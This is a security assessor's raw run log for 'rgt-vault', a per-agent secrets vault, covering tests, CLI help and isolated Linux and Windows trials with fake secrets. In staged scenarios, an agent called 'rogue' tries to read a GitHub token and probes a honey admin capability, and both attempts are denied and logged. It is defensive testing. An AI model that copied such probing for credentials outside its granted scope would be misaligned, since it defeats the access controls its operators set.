# Run log: raw evidence (2026-11-27)

Appendix to [ASSESSMENT.md](ASSESSMENT.md). Everything below was produced by commands run by the assessor
against **master `5a049d2`** (binary built with `cd go && go build ./cmd/rgt-vault`, go1.27.4).

## How the runs were isolated

- **Linux host:** nitoryu (Ubuntu 24.04.5, kernel 6.8). Every command ran under `env -i` with a throw-away
  `HOME` (shown as `~`), so no real vault, token or config was touched. `~/.secure-vault` and
  `~/.config/rgt-vault` did not exist in the real home before or after.
- **Keyring:** this host has no Secret Service (`gnome-keyring`/KWallet are not installed), so the default
  provider cannot work here (section A0). To get past that I ran a private `dbus-daemon` on an abstract
  socket with a 120-line fake `org.freedesktop.secrets` service (Python, in-memory + JSON file in the temp
  dir). This is test scaffolding, not a recommendation. The real session bus was not used.
- **Upstream API:** a loopback TLS mock (`https://127.0.0.1:18443`, self-signed, trusted via
  `SSL_CERT_FILE`) that answers 200 only if the expected bearer credential arrives, plus a second listener
  on :18444 standing in for an attacker-controlled host. No external service was contacted.
- **Secrets:** only fake values. Tokens, TOTP codes and signed capability tokens are redacted below.
- **Windows:** the lab VM `windows-pro` (Windows 11 Pro 25H2), cloned the public repo over https, built
  natively, ran in the interactive desktop session; everything was removed afterwards (vault, tokens,
  Credential Manager entry `rgt_vault`).
- All servers and helpers were stopped at the end.

**Assessor errors kept in the log on purpose** (they are mine, not the product's): section C ran against a
stale server for a few commands (allow-all policy); the first two attempts at section D used a wrong JSON
field / an `operator` name that the server rejects; one probe in section H used a wrong bus address; the
first Windows script used a function name that PowerShell aliases. Each is marked where it happens.

## A0. First contact on this host, before any scaffolding

```text
$ rgt-vault version
Error: unknown command "version" for "rgt-vault"
$ rgt-vault --version
rgt-vault version dev (commit none, built unknown)
$ rgt-vault init                         # real session bus, temp HOME
Error: opening vault ~/.secure-vault/vault.db: read OS keyring entry "rgt_vault"/"master_key": The name org.freedesktop.secrets was not provided by any .service files
[exit 1]
$ rgt-vault init --provider platform
Error: platform provider: sealed private blob not found: /etc/vault/sealed/master_secret.priv: file does not exist
[exit 1]
$ find ~ -type f                          # the failed init left a database behind
~/.secure-vault/vault.db
$ busctl --user list | grep -i -E "secret|keyring|kwallet"     # nothing
$ dpkg -l | grep -E "gnome-keyring|tpm2-tools"                 # nothing (only libtss2-tcti-swtpm0)
$ ls /dev/tpm*
/dev/tpm0 /dev/tpmrm0
```

## Test suite

```text
$ cd go && go test -race -count=1 ./...        (wall 1:28, peak RSS 2.4 GB)
?   	rgt-vault-server/cmd/gateway	[no test files]
ok  	rgt-vault-server/cmd/rgt-vault	25.744s
ok  	rgt-vault-server/cmd/server	1.027s
ok  	rgt-vault-server/internal/actions	2.414s
ok  	rgt-vault-server/internal/approval	2.724s
ok  	rgt-vault-server/internal/asvs	5.463s
ok  	rgt-vault-server/internal/audit	5.338s
ok  	rgt-vault-server/internal/auth	4.636s
ok  	rgt-vault-server/internal/capabilities	1.772s
ok  	rgt-vault-server/internal/captoken	1.583s
ok  	rgt-vault-server/internal/compat	13.860s
ok  	rgt-vault-server/internal/crypto	1.024s
ok  	rgt-vault-server/internal/cryptopolicy	2.945s
ok  	rgt-vault-server/internal/gateway	1.530s
ok  	rgt-vault-server/internal/honeycap	3.567s
ok  	rgt-vault-server/internal/hooks	1.794s
ok  	rgt-vault-server/internal/hooks/pyfmt	1.018s
ok  	rgt-vault-server/internal/kdf	3.502s
ok  	rgt-vault-server/internal/keychain	4.010s
ok  	rgt-vault-server/internal/logging	25.877s
ok  	rgt-vault-server/internal/mcp	3.657s
ok  	rgt-vault-server/internal/netguard	1.478s
ok  	rgt-vault-server/internal/policy	2.929s
ok  	rgt-vault-server/internal/providers	2.238s
ok  	rgt-vault-server/internal/providers/providerstest	1.020s
ok  	rgt-vault-server/internal/servecmd	5.227s
ok  	rgt-vault-server/internal/server	21.493s
ok  	rgt-vault-server/internal/server/handlers	1.061s
ok  	rgt-vault-server/internal/store	12.023s
ok  	rgt-vault-server/internal/tlstest	1.032s
ok  	rgt-vault-server/internal/totp	1.234s
ok  	rgt-vault-server/internal/transport	2.546s
ok  	rgt-vault-server/internal/tui	2.833s
ok  	rgt-vault-server/internal/validation	1.398s
ok  	rgt-vault-server/internal/vault	63.576s
	Elapsed (wall clock) time (h:mm:ss or m:ss): 1:27.99
	Maximum resident set size (kbytes): 2408364
exit=0
$ go vet ./...                                  -> exit 0
$ GOOS=windows|darwin|linux(arm64) CGO_ENABLED=0 go build ./cmd/rgt-vault   -> all ok (21-23 MB)
$ bash scripts/lint_systemd_units.sh            -> all 2 unit file(s) passed (rgt-vault-go.service exposure 1.3 OK)
$ bash scripts/test_lint_systemd_units.sh       -> all lint tests passed
```

Not run: `govulncheck` (it contacts vuln.go.dev, outside the allowed services; CI's "security scan" job is
green on master), goreleaser (not installed locally).

## GitHub state (via gh)

```text
repo: public, not archived, default branch master, Apache-2.0
branches/master: protected=false, required_status_checks: none          (rulesets: [])
releases/latest: 404 Not Found        releases: v0.3.0 (DRAFT, 2026-06-24, the in-memory stub), v0.1.0 (pre-release)
https://github.com/WilliamHudspeth/rgt-vault/releases/latest/download/rgt-vault-go_Linux_x86_64.tar.gz -> HTTP 404
master 5a049d2: CodeQL ok, Scorecard ok, review-gate ok, CI FAILED
  failing job: test (windows-latest / py3.13)  tests/test_examples.py::test_scenario_demo_runs_and_keeps_secret[slack_demo]
               PolicyDeniedError: ... approval timed out after 10s     (Python EOL line, timing flake)
open PRs: #23 #22 #19 (docs, mergeable, updated 2026-11-26), #16 #15 (drafts, last updated 2026-07-29, 13 failing checks each)
```

## Windows VM run (master 5a049d2, native build 26 s, interactive desktop session)

Over the non-interactive (SSH) session the keyring is unreachable:

```text
> rgt-vault.exe init
Error: opening vault C:\Users\tester\.secure-vault\vault.db: read OS keyring entry "rgt_vault"/"master_key": A specified logon session does not exist. It may already have been terminated.
```

In the desktop session (PowerShell records stderr lines of native commands as errors; those wrappers are
removed here):

```text
> rgt-vault --version
rgt-vault version dev (commit none, built unknown)
[exit 0]
> rgt-vault init
rgt-vault initialised.
  vault:           C:\Users\tester\.secure-vault\vault.db  created  id 5638f358-7194-4a3d-a0b3-35a8daf084c9  epoch 1
  token store:     C:\Users\tester\.config\rgt-vault\tokens.json (0600, hashes only)
  operator token:  C:\Users\tester\.config\rgt-vault\operator.token  created as tok_<id> (0600)
Tokens are never printed. Next: write a policy, then
  rgt-vault token mint --agent <name> [--scope agent,lease] --out <file>   (one per agent)
  rgt-vault serve --policy policy.yaml
[exit 0]
> token mint coder
rgt-vault.exe : WARNING: TOKEN_MINTED token=tok_<id> agent=coder scopes=agent expires=never 
by=WINPRO\tester
minted id tok_<id>  agent coder  scopes agent  expires never
token written to coder.token (0600)
[exit 0]
> token mint rogue
rgt-vault.exe : WARNING: TOKEN_MINTED token=tok_<id> agent=rogue scopes=agent expires=never 
by=WINPRO\tester
minted id tok_<id>  agent rogue  scopes agent  expires never
token written to rogue.token (0600)
[exit 0]
> rgt-vault status
Server OK: http://127.0.0.1:8765
[exit 0]
> set GITHUB_TOKEN (operator)
Secret stored.
[exit 0]
> list as operator
GITHUB_TOKEN	2026-11-28T03:55:58.090541+00:00
[exit 0]
> coder uses the secret (echo action)
{"action":"echo","ok":true,"result":{"leaked_secret":false,"message":"lease ok; secret NOT returned","ok":true,"secret_len":39}}
> coder, wrong purpose
HTTP 403 {"error":"PolicyDeniedError","detail":"Agent 'coder' denied read access to 'GITHUB_TOKEN' (github/billing)","incident_id":"98dc5ec51a6f4120"}
> rogue
HTTP 403 {"error":"PolicyDeniedError","detail":"Agent 'rogue' denied read access to 'GITHUB_TOKEN' (github/ci-build)","incident_id":"403fefacfd13a746"}
> rogue probes a honey capability
HTTP 400 {"error":"ValidationError","detail":"execute_capability requires a configured token_verifier; set vault.Config.TokenVerifier","incident_id":"9895866d80d3116a"}
> coder tries to read plaintext (lease)
HTTP 403 {"error":"AuthorizationError","detail":"insufficient scope for this route","incident_id":"6d529786f67fbae2"}
> rotate dek
Rotation complete.
[exit 0]
> verify-audit
OK
[exit 0]
> export
rgt-vault.exe : Exported to backup.b64
[exit 0]
> status --offline
vault_id:     5638f358-7194-4a3d-a0b3-35a8daf084c9
key_epoch:    2
active secrets: 1
  github: 1
audit rows:   27
last action:  2026-11-28T03:56:01.055542+00:00  HTTP_API  -
audit chain:  OK
[exit 0]
> serve.err (tail)
2026/11/28 03:55:58 HTTP POST /v1/secrets/github/GITHUB_TOKEN/use -> 200 (29.746ms)
2026/11/28 03:55:58 WARNING incident=98dc5ec51a6f4120 status=403 error=PolicyDeniedError path=/v1/secrets/github/GITHUB_TOKEN/use
2026/11/28 03:55:58 HTTP POST /v1/secrets/github/GITHUB_TOKEN/use -> 403 (20.131ms)
2026/11/28 03:55:58 WARNING incident=403fefacfd13a746 status=403 error=PolicyDeniedError path=/v1/secrets/github/GITHUB_TOKEN/use
2026/11/28 03:55:58 HTTP POST /v1/secrets/github/GITHUB_TOKEN/use -> 403 (23.698ms)
2026/11/28 03:55:58 WARNING: security event HONEY_CAPABILITY_TRIGGERED request="" agent="rogue" operator="" detail="honey capability \"aws.admin.full\" probed via capability.execute (version 1, token presented: true)"
2026/11/28 03:55:58 WARNING incident=9895866d80d3116a status=400 error=ValidationError path=/v1/capabilities/execute
2026/11/28 03:55:58 HTTP POST /v1/capabilities/execute -> 400 (6.074ms)
2026/11/28 03:55:59 WARNING incident=6d529786f67fbae2 status=403 error=AuthorizationError method=POST path=/v1/secrets/github/GITHUB_TOKEN/lease
2026/11/28 03:55:59 HTTP POST /v1/secrets/github/GITHUB_TOKEN/lease -> 403 (75.472ms)
2026/11/28 03:56:00 HTTP POST /v1/rotate -> 200 (1.581017s)
2026/11/28 03:56:01 HTTP POST /v1/audit/verify -> 200 (683A�s)
> file ACLs
NT AUTHORITY\SYSTEM FullControl
BUILTIN\Administrators FullControl
WINPRO\tester FullControl
DONE
```

## Linux run (isolated HOME, fake Secret Service)

```text

## A. Quickstart from docs/getting-started/installation.md, literally (binary named rgt-vault on PATH)

$ rgt-vault --version
rgt-vault version dev (commit none, built unknown)
[exit 0]

$ rgt-vault init
rgt-vault initialised.
  vault:           ~/.secure-vault/vault.db  created  id de1f0677-81eb-47c9-ab98-fbe80c1a3fba  epoch 1
  token store:     ~/.config/rgt-vault/tokens.json (0600, hashes only)
  operator token:  ~/.config/rgt-vault/operator.token  created as tok_<id> (0600)
Tokens are never printed. Next: write a policy, then
  rgt-vault token mint --agent <name> [--scope agent,lease] --out <file>   (one per agent)
  rgt-vault serve --policy policy.yaml
[exit 0]

$ rgt-vault status
Server OK: http://127.0.0.1:8765
[exit 0]

$ echo "my-secret-value" | rgt-vault set api-key --namespace prod
Error: no bearer token: pass --token, or set RGT_VAULT_TOKEN or RGT_VAULT_TOKEN_FILE (a token minted for this agent: rgt-vault token mint --agent NAME --out FILE); an operator may add --as-operator to use ~/.config/rgt-vault/operator.token
[exit 1]

$ rgt-vault list --namespace prod
Error: no bearer token: pass --token, or set RGT_VAULT_TOKEN or RGT_VAULT_TOKEN_FILE (a token minted for this agent: rgt-vault token mint --agent NAME --out FILE); an operator may add --as-operator to use ~/.config/rgt-vault/operator.token
[exit 1]

$ rgt-vault get api-key --namespace prod
Error: no bearer token: pass --token, or set RGT_VAULT_TOKEN or RGT_VAULT_TOKEN_FILE (a token minted for this agent: rgt-vault token mint --agent NAME --out FILE); an operator may add --as-operator to use ~/.config/rgt-vault/operator.token
[exit 1]

$ rgt-vault verify-audit
OK
[exit 0]
elapsed: 1.902065564 s

## A2. Same quickstart with --as-operator (what the error message suggests)

$ echo "my-secret-value" | rgt-vault set api-key --namespace prod --as-operator
Secret stored.
[exit 0]

$ rgt-vault list --namespace prod --as-operator
api-key	2026-11-28T03:40:30.595661+00:00
[exit 0]

$ rgt-vault get api-key --namespace prod --as-operator
Error: get failed: HTTP 403
[exit 1]

$ rgt-vault fingerprint api-key --namespace prod --as-operator
063fd620
[exit 0]

$ rgt-vault audit
{"entries":[{"id":11,"action":"HTTP_API","secret_name":null,"timestamp":"2026-11-28T03:40:30.619129+00:00","details":"token=tok_<id> ip=127.0.0.1 GET /v1/audit","prev_hash":"a8496c16a4f1a11e75e9ab461122d7170031ac57d8362cc39a308b875138280e","entry_hash":"65a2aeb99092debbd9ffadb35d44c3d1f03cfdb8afa3f014f0ce89f34a106959","policy_hash":"a6ac95a0785dc751","agent_id":"operator"},{"id":10,"action":"GET_SECRET","secret_name":"api-key","timestamp":"2026-11-28T03:40:30.613685+00:00","details":"Version latest accessed from prod","prev_hash":"78783cca79d1aa23af7a6ef8fcfb3bffda1734ed79247b43f8e3b70049235544","entry_hash":"a8496c16a4f1a11e75e9ab461122d7170031ac57d8362cc39a308b875138280e","policy_hash":"a6ac95a0785dc751","agent_id":null},{"id":9,"action":"HTTP_API","secret_name":null,"timestamp":"2026-11-28T03:40:30.613416+00:00","details":"token=tok_<id> ip=127.0.0.1 GET /v1/secrets/prod/api-key","prev_hash":"1282eaafec37c829361d7f676af29f5f955e8b8eb6a4c92fd9d71fa1b2c798f7","entry_hash":"78783cca79d1aa23af7a6ef8fcfb3bffda1734ed79247b43f8e3b70049235544","policy_hash":"a6ac95a0785dc751","agent_id":"operator"},{"id":8,"action":"AUTHZ_DENIED","secret_name":null,"timestamp":"2026-11-28T03:40:30.607275+00:00","details":"token=tok_<id> ip=127.0.0.1 POST /v1/secrets/prod/api-key/lease reason=missing scope agent+lease","prev_hash":"5aebbc3ba33704fa8f0cf066facebe039c7b2df35cbc7a2a481df115842222f1","entry_hash":"1282eaafec37c829361d7f676af29f5f955e8b8eb6a4c92fd9d71fa1b2c798f7","policy_hash":"a6ac95a0785dc751","agent_id":"operator"},{"id":7,"action":"LIST_SECRETS","secret_name":null,"timestamp":"2026-11-28T03:40:30.601532+00:00","details":"Listed 1 secrets in prod","prev_hash":"de7f2d588c4945968a33c6245f43ad23e4962ef479870234fc5285029f4724c1","entry_hash":"5aebbc3ba33704fa8f0cf066facebe039c7b2df35cbc7a2a481df115842222f1","policy_hash":"a6ac95a0785dc751","agent_id":null},{"id":6,"action":"HOOK_LIST","secret_name":null,"timestamp":"2026-11-28T03:40:30.601403+00:00","details":"{\"hook_id\": \"off\", \"decision\": \"allow\", \"reason\": \"hook disabled\"}","prev_hash":"651be843b7304dfea5a2709a43740ea946cfc54bc8c6375c6434f01a21adebbb","entry_hash":"de7f2d588c4945968a33c6245f43ad23e4962ef479870234fc5285029f4724c1","policy_hash":"a6ac95a0785dc751","agent_id":null},{"id":5,"action":"HTTP_API","secret_name":null,"timestamp":"2026-11-28T03:40:30.601282+00:00","details":"token=tok_<id> ip=127.0.0.1 GET /v1/secrets","prev_hash":"0991432f5d848fc063c72d9138241d237b24bafd431c6208be33654ce6e0afe1","entry_hash":"651be843b7304dfea5a2709a43740ea946cfc54bc8c6375c6434f01a21adebbb","policy_hash":"a6ac95a0785dc751","agent_id":"operator"},{"id":4,"action":"SET_SECRET","secret_name":"api-key","timestamp":"2026-11-28T03:40:30.595801+00:00","details":"Version 1 created in prod","prev_hash":"77f8e5f9ea3719297fb04695aadb8cf16a86d06bf530a14b92032b9bf6ccd443","entry_hash":"0991432f5d848fc063c72d9138241d237b24bafd431c6208be33654ce6e0afe1","policy_hash":"a6ac95a0785dc751","agent_id":null},{"id":3,"action":"HOOK_WRITE","secret_name":"api-key","timestamp":"2026-11-28T03:40:30.595591+00:00","details":"{\"hook_id\": \"off\", \"decision\": \"allow\", \"reason\": \"hook disabled\"}","prev_hash":"5139c832eab2819e9e0638e386df062d43c04c078d1499792aa4c0b592de397d","entry_hash":"77f8e5f9ea3719297fb04695aadb8cf16a86d06bf530a14b92032b9bf6ccd443","policy_hash":"a6ac95a0785dc751","agent_id":null},{"id":2,"action":"HTTP_API","secret_name":null,"timestamp":"2026-11-28T03:40:30.595388+00:00","details":"token=tok_<id> ip=127.0.0.1 POST /v1/secrets","prev_hash":"63fd67eba54b9704b4912a4b6b7e138a34c59bd45ab8549a643d5c90c3a06420","entry_hash":"5139c832eab2819e9e0638e386df062d43c04c078d1499792aa4c0b592de397d","policy_hash":"a6ac95a0785dc751","agent_id":"operator"},{"id":1,"action":"HTTP_API","secret_name":null,"timestamp":"2026-11-28T03:40:23.974313+00:00","details":"token=tok_<id> ip=127.0.0.1 POST /v1/audit/verify","prev_hash":"","entry_hash":"63fd67eba54b9704b4912a4b6b7e138a34c59bd45ab8549a643d5c90c3a06420","policy_hash":"a6ac95a0785dc751","agent_id":"operator"}]}
[exit 0]

$ rgt-vault status --offline
vault_id:     de1f0677-81eb-47c9-ab98-fbe80c1a3fba
key_epoch:    1
active secrets: 1
  prod: 1
audit rows:   11
last action:  2026-11-28T03:40:30.619129+00:00  HTTP_API  -
audit chain:  OK
[exit 0]

## B. help for main subcommands

$ rgt-vault serve --help
Open the vault at --db (creating it on first use), serve the HTTP API on --host:--port and
keep every secret on disk, so data persists across restarts.

Without --policy every request is denied (default deny). Without --harness-key-file
/v1/capabilities/execute fails closed.

Without --tls-cert/--tls-key the server speaks plain HTTP and only a loopback --host is
accepted. With them it serves TLS 1.2+ (AEAD suites only); --tls-client-ca adds mutual TLS.

Usage:
  rgt-vault serve [flags]

Flags:
      --allow-insecure-non-loopback      permit a non-loopback --host WITHOUT TLS (plain HTTP: tokens and secrets cross the network unencrypted; logged and audited)
      --allow-private-network            let built-in HTTP actions reach loopback/private addresses (SSRF risk)
      --approval-timeout duration        how long an approval request waits before it is denied (default 2m0s)
      --harness-key-file string          HMAC key for v2 capability tokens (env RGT_VAULT_HARNESS_KEY_FILE)
  -h, --help                             help for serve
      --host string                      listen address (env RGT_VAULT_HOST, default 127.0.0.1)
      --legacy-allow-privileged-routes   with --legacy-shared-token: let the shared token also reach the plaintext lease route, /v1/rotate and the audit log (full pre-H1 exposure)
      --legacy-shared-token              DEPRECATED: authenticate with one shared token file and the self-asserted agent field (pre-H1 behaviour); the lease route, /v1/rotate and the audit log are then refused
      --operator-token-file string       legacy only: operator token for approve/deny (env RGT_VAULT_OPERATOR_TOKEN_FILE)
      --port string                      listen port (env RGT_VAULT_PORT, default 8765)
      --require-approval                 require live operator approval for every unseal
      --require-approval-for string      also require live operator approval for these operations: comma list of set, rotate, revoke or all (env RGT_VAULT_REQUIRE_APPROVAL_FOR; default none; the approver must be another token than the requester)
      --security-webhook-allow-remote    let the security webhook reach a non-loopback host
      --tls-cert string                  PEM certificate (chain) to serve HTTPS with (env RGT_VAULT_TLS_CERT); needs --tls-key
      --tls-client-auth string           mutual TLS mode: require (default with --tls-client-ca) or verify-if-given (env RGT_VAULT_TLS_CLIENT_AUTH)
      --tls-client-ca string             PEM CA bundle that signs client certificates: enables mutual TLS (env RGT_VAULT_TLS_CLIENT_CA); the bearer token is still required
      --tls-key string                   PEM private key for --tls-cert (env RGT_VAULT_TLS_KEY); refused if group/other can read it
      --tls-reload-interval duration     how often the TLS files are checked for a change and reloaded without dropping connections (0 = only on SIGHUP) (default 1m0s)
      --token-file string                legacy only: shared agent token file (env RGT_VAULT_TOKEN_FILE, default ~/.config/rgt-vault/server.token; created 0600 if missing)
      --token-store rgt-vault token      per-agent token store (env RGT_VAULT_TOKEN_STORE, default ~/.config/rgt-vault/tokens.json; see rgt-vault token)
      --totp-secret-file string          base32 TOTP secret for 2FA approvals (env RGT_VAULT_TOTP_SECRET_FILE; see enroll-2fa)

[Global Flags omitted]
[exit 0]

$ rgt-vault token --help
Each token belongs to one agent and carries scopes:

  agent     act as that agent on the secrets routes (ABAC applies)
  lease     also read plaintext values (POST .../lease; with agent)
  audit     read and verify the audit log
  operator  approve/deny, rotate keys, read the audit log

The store keeps only sha256 hashes; a token is shown once when minted.

Usage:
  rgt-vault token [command]

Available Commands:
  import      Add an existing token file (e.g. a pre-H1 token) to the store under an agent
  list        List tokens: id, agent, scopes, created, expiry (never hashes or tokens)
  mint        Create a token for an agent (printed once, or written to --out)
  revoke      Revoke a token (a running server rejects it at the next request)
  rotate      Replace a token by a new one for the same agent and scopes (the old one stops working)

Flags:
  -h, --help           help for token
      --store string   token store file (env RGT_VAULT_TOKEN_STORE, default ~/.config/rgt-vault/tokens.json)

[Global Flags omitted]

Use "rgt-vault token [command] --help" for more information about a command.
[exit 0]

$ rgt-vault token mint --help
Create a token for an agent (printed once, or written to --out)

Usage:
  rgt-vault token mint [flags]

Flags:
      --agent string       agent id the token acts as (required)
      --expires duration   lifetime, e.g. 24h (default: no expiry)
  -h, --help               help for mint
      --out string         write the token to this new file (0600) instead of printing it
      --scope string       comma-separated scopes: agent, lease, audit, operator (default "agent")

[Global Flags omitted]
[exit 0]

$ rgt-vault set --help
Store a secret (pipe value via stdin or --value-file)

Usage:
  rgt-vault set <name> [flags]

Flags:
      --agent string        agent label: with per-agent tokens the server uses the token's agent and refuses a different one (only legacy shared-token servers use it)
  -h, --help                help for set
      --namespace string    secret namespace (default "default")
      --purpose string      purpose label
      --value-file string   read secret from file instead of stdin

[Global Flags omitted]
[exit 0]

$ rgt-vault get --help
Print a secret's plaintext.

By default the value comes from the running server (POST /v1/secrets/{ns}/{name}/lease, a
lease performed server-side as the token's agent; the token needs the agent AND lease
scopes). With --offline (or an explicit --db) the vault files are opened locally instead:
operator-only, no server involved, same ABAC policy (--policy) and the same audit rows.
--purpose is required offline; --agent defaults to "system" offline.

Usage:
  rgt-vault get <name> [flags]

Flags:
      --agent string       agent label: with per-agent tokens the server uses the token's agent and refuses a different one (only legacy shared-token servers use it)
  -h, --help               help for get
      --namespace string   secret namespace (default "default")
      --offline            open the vault files locally instead of asking a server (operator only)
      --purpose string     purpose label (required with --offline)

[Global Flags omitted]
[exit 0]

$ rgt-vault list --help
List secrets in a namespace

Usage:
  rgt-vault list [flags]

Flags:
      --agent string       agent identity (default "system")
  -h, --help               help for list
      --namespace string   secret namespace (default "default")

[Global Flags omitted]
[exit 0]

$ rgt-vault revoke --help
Revoke (soft-delete) a secret

Usage:
  rgt-vault revoke <name> [flags]

Flags:
  -h, --help               help for revoke
      --namespace string   secret namespace (default "default")

[Global Flags omitted]
[exit 0]

$ rgt-vault simulate --help
Simulate a policy decision without accessing secrets

Usage:
  rgt-vault simulate [flags]

Flags:
      --action string      action to simulate (read|write) (default "read")
      --agent string       agent to simulate (default: the token's agent; another agent needs the operator scope)
  -h, --help               help for simulate
      --namespace string   secret namespace (default "default")
      --purpose string     purpose label

[Global Flags omitted]
[exit 0]

$ rgt-vault rotate --help
Rotate the master key or DEK

Usage:
  rgt-vault rotate [flags]

Flags:
  -h, --help            help for rotate
      --target string   what to rotate: master | dek (default "master")

[Global Flags omitted]
[exit 0]

$ rgt-vault audit --help
Print audit log entries

Usage:
  rgt-vault audit [flags]

Flags:
  -h, --help        help for audit
      --limit int   maximum entries to return (default 100)

[Global Flags omitted]
[exit 0]

$ rgt-vault verify-audit --help
Verify the audit log hash chain: prints OK, or TAMPERED and exits 2.

By default the running server verifies its own log. With --offline (or an explicit --db) the
database is opened read-only and checked locally; no server and no master secret are needed.

Usage:
  rgt-vault verify-audit [flags]

Flags:
  -h, --help      help for verify-audit
      --offline   verify the database file directly (read-only)

[Global Flags omitted]
[exit 0]

$ rgt-vault enroll-2fa --help
Generate a TOTP secret, write it to --out (mode 0600 from the moment the file is created) and
print the provisioning URI for an authenticator app.

The provisioning URI and the secret are shown once, on the terminal, so you can add them to an
authenticator app; when stdout is redirected or piped they are NOT printed unless you pass
--show-secret (so they do not end up in logs). The file is always written.

An existing secret file is never overwritten without --force. A forced replacement locks
out the old authenticator, so it needs an operator token (or, when there is no operator token to
check, --i-am-offline-operator; a named --token-store that does not exist is an error)
(--token, RGT_VAULT_TOKEN, RGT_VAULT_TOKEN_FILE or ~/.config/rgt-vault/operator.token), prints a
warning, and is recorded in the vault's audit log (TOTP_SECRET_REPLACED) with the operator token id
and a short fingerprint of the OLD secret (never the secret itself); if a vault exists at --db but
cannot be opened to record it, the secret is left untouched.

Usage:
  rgt-vault enroll-2fa [flags]

Flags:
      --account string          account label for the authenticator app (default "operator")
      --force                   replace an existing secret file (needs an operator token when the token store has one; audited; the old authenticator stops working)
  -h, --help                    help for enroll-2fa
      --i-am-offline-operator   with --force: replace the secret although there is no operator token to check (no token store, or none with the operator scope); recorded in the audit row
      --out string              where to write the base32 secret (default "~/.config/rgt-vault/totp.secret")
      --show-secret             print the provisioning URI and secret even when stdout is not a terminal
      --token-store string      token store that holds the operator token checked by --force (env RGT_VAULT_TOKEN_STORE, default ~/.config/rgt-vault/tokens.json)

[Global Flags omitted]
[exit 0]

$ rgt-vault export --help
Write every secret row (still encrypted), the audit log and the honeytokens as
base64(JSON), byte-compatible with Python's export_vault (v1): either line can import it.
Secrets are bound to this vault's id and key, so an export only restores into the same vault.

To stdout by default; with --out the file is created 0600 and an existing file is not
overwritten without --force.

Usage:
  rgt-vault export [flags]

Flags:
      --force        overwrite an existing --out file
  -h, --help         help for export
      --out string   write the export to this file (0600) instead of stdout

[Global Flags omitted]
[exit 0]

$ rgt-vault import --help
Read an export (from Go or Python, v1) from --in or stdin and replace this vault's secrets,
audit log and honeytokens with it, in one transaction. An export of another vault (different
vault_id) is refused. This REPLACES existing data, so --yes is required.

Usage:
  rgt-vault import [flags]

Flags:
  -h, --help        help for import
      --in string   read the export from this file (default stdin)
      --yes         confirm that the vault's current contents are replaced

[Global Flags omitted]
[exit 0]

$ rgt-vault migrate --help
Python-to-Go migration helpers

Usage:
  rgt-vault migrate [command]

Available Commands:
  check       Check that a Python-created vault can be opened by this build (read-only)

Flags:
  -h, --help   help for migrate

[Global Flags omitted]

Use "rgt-vault migrate [command] --help" for more information about a command.
[exit 0]

$ rgt-vault mcp --help
Run a stdio MCP server bridging to the vault backend

Usage:
  rgt-vault mcp [flags]

Flags:
      --agent string   agent label (default $RGT_VAULT_MCP_AGENT, else none): the server takes the agent from the token and refuses a different label; set it only for a legacy shared-token server (e.g. "mcp-client")
  -h, --help           help for mcp

[Global Flags omitted]
[exit 0]

$ rgt-vault tui --help
Launch the interactive dashboard (read-only by default)

Usage:
  rgt-vault tui [flags]

Flags:
  -h, --help               help for tui
      --namespace string   namespace to display (default "default")

[Global Flags omitted]
[exit 0]

$ rgt-vault status --help
Without flags: ask the server's /healthz whether it is up.

With --offline (or an explicit --db): open the database read-only and print the vault id, key
epoch, active secrets per namespace, audit row count and the audit chain verdict (exit 2 when
TAMPERED). No server and no master secret are needed.

Usage:
  rgt-vault status [flags]

Flags:
  -h, --help      help for status
      --offline   summarise the database file directly (read-only)

[Global Flags omitted]
[exit 0]

$ rgt-vault crypto-audit --help
Verify active cryptographic parameters and run the crypto self-test

Usage:
  rgt-vault crypto-audit [flags]

Flags:
  -h, --help              help for crypto-audit
      --json              emit audit report as JSON
      --keychain string   optional keychain.json file to verify against policy floors
      --policy string     optional strengthen-only crypto policy YAML/JSON file

[Global Flags omitted]
[exit 0]

## C. Realistic agent flow (no approval yet): per-agent tokens, scoped policy, actions

$ rgt-vault token mint --agent coder --out coder.token
WARNING: TOKEN_MINTED token=tok_<id> agent=coder scopes=agent expires=never by=will
minted id tok_<id>  agent coder  scopes agent  expires never
token written to coder.token (0600)
[exit 0]

$ rgt-vault token mint --agent deploy_bot --scope agent,lease --expires 24h --out deploy.token
WARNING: TOKEN_MINTED token=tok_<id> agent=deploy_bot scopes=agent,lease expires=2026-11-29T03:42:09Z by=will
minted id tok_<id>  agent deploy_bot  scopes agent,lease  expires 2026-11-29T03:42:09Z
token written to deploy.token (0600)
[exit 0]

$ rgt-vault token mint --agent rogue --out rogue.token
WARNING: TOKEN_MINTED token=tok_<id> agent=rogue scopes=agent expires=never by=will
minted id tok_<id>  agent rogue  scopes agent  expires never
token written to rogue.token (0600)
[exit 0]

$ rgt-vault token mint --agent auditor --scope audit --out auditor.token
WARNING: TOKEN_MINTED token=tok_<id> agent=auditor scopes=audit expires=never by=will
minted id tok_<id>  agent auditor  scopes audit  expires never
token written to auditor.token (0600)
[exit 0]

$ rgt-vault token list
ID                    AGENT       SCOPES                CREATED               EXPIRES
tok_<id>  operator    agent,operator,audit  2026-11-28T03:40:22Z  never
tok_<id>  deploy_bot  agent,lease           2026-11-28T03:42:09Z  2026-11-29T03:42:09Z
tok_<id>  coder       agent                 2026-11-28T03:42:09Z  never
tok_<id>  rogue       agent                 2026-11-28T03:42:09Z  never
tok_<id>  auditor     audit                 2026-11-28T03:42:09Z  never
[exit 0]

$ rgt-vault init --harness-key-file ~/.config/rgt-vault/harness.key
rgt-vault initialised.
  vault:           ~/.secure-vault/vault.db  kept (opened and verified)  id de1f0677-81eb-47c9-ab98-fbe80c1a3fba  epoch 1
  token store:     ~/.config/rgt-vault/tokens.json (0600, hashes only)
  operator token:  ~/.config/rgt-vault/operator.token  kept (in the store as tok_<id>)
  harness key file: ~/.config/rgt-vault/harness.key  created (0600)
Tokens are never printed. Next: write a policy, then
  rgt-vault token mint --agent <name> [--scope agent,lease] --out <file>   (one per agent)
  rgt-vault serve --policy policy.yaml
[exit 0]

$ rgt-vault set GITHUB_TOKEN --namespace github --purpose setup --as-operator --value-file $HARNESS/demo_github_token.txt
Secret stored.
[exit 0]

$ echo deploy-key-material-123 | rgt-vault set DEPLOY_KEY --namespace deploy --as-operator
Secret stored.
[exit 0]

$ rgt-vault --token <redacted-test-token> list --namespace github
GITHUB_TOKEN	2026-11-28T03:42:11.539344+00:00
[exit 0]

$ env RGT_VAULT_TOKEN_FILE=coder.token rgt-vault list --namespace github
GITHUB_TOKEN	2026-11-28T03:42:11.539344+00:00
[exit 0]

$ env RGT_VAULT_TOKEN_FILE=coder.token rgt-vault simulate --namespace github --purpose ci-build --action read
